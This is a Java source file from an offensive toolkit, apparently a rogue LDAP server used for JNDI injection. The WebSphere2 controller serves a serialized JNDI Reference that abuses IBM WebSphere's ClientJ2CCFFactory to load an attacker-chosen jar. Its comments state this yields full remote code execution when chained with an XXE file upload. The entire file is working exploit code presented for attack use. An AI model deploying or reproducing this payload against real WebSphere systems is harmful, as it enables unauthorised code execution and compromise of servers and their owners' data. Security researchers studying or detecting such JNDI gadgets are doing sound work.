package artsploit.controllers;

import artsploit.Config;
import artsploit.Utilities;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;

import java.util.Properties;

import static artsploit.Utilities.serialize;

/**
 * WebSphere2 attack leverages {@link com.ibm.ws.client.applicationclient.ClientJ2CCFFactory}
 *  to load an arbitrary Bean class with the ability to add any local jar to the classpath
 *
 * Yields:
 *  loading and executing any local jar file via classpath manipulation
 *  Since we can upload any jar file into /temp folder via XXE in {@link WebSphere1}, this attack could lead to a full RCE
 *  @see artsploit.HttpServer for a set of malicious WSDL payloads
 *
 * Requires:
 * - websphere v6-9 libraries in the classpath
 *
 * @author artsploit
 */
@LdapMapping(uri = { "/o=websphere2", "/o=websphere2,jar=*" })
public class WebSphere2 implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        //get localJar from the url parameter
        String localJar = Utilities.getDnParam(result.getRequest().getBaseDN(), "jar");
        if(localJar == null)
            localJar = Config.localjar; //get from config if not specified

        System.out.println("Sending Websphere2 payload pointing to " + localJar);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare a payload that leverages arbitrary local classloading in com.ibm.ws.client.applicationclient.ClientJMSFactory
        Reference ref = new Reference("ExportObject",
                "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory", null);
        Properties refProps = new Properties();
        refProps.put("com.ibm.ws.client.classpath", localJar);
        refProps.put("com.ibm.ws.client.classname", "xExportObject");
        ref.add(new com.ibm.websphere.client.factory.jdbc.PropertiesRefAddr("JMSProperties", refProps));

        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
